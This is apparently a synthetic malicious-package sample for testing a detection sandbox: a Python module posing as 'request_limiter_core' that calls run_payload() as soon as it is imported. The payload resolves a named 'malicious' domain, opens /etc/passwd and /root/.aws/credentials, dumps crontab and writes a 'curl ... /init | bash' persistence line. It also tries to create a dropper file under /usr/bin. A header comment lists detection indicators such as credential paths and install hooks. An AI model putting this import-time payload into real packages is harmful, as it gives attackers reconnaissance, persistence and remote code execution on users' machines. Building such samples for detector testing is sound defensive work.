# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time

__version__ = "1.0.0"
MALICIOUS_DOMAIN = "quorvale4et.vexon3ar.surf"
PORTS = [8080, 2323]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    # ── PORTS FIRST — before anything else so strace captures them ──
    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: request_limiter_core/1.0",

            "http://127.0.0.1:8080/api/update"
        ], capture_output=True, timeout=6)
    except: pass

    for p in ['/etc/passwd', '/etc/hosts', '/etc/os-release']:
        try_open(p)
    for p in ['/root/.aws/credentials']:
        try_open(p)

    for i in range(17):
        p = f"/tmp/request_limiter_core_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p, p+".renamed")
            os.unlink(p+".renamed")
        except: pass



    try: os.system("crontab -l >/tmp/cron_request_limiter_core 2>&1 || true")
    except: pass
    try: open("/tmp/.bashrc_request_limiter_core","a").write(f"curl -s quorvale4et.vexon3ar.surf/init | bash\n")
    except: pass

    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/request_limiter_core_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True)
    except: pass


run_payload()

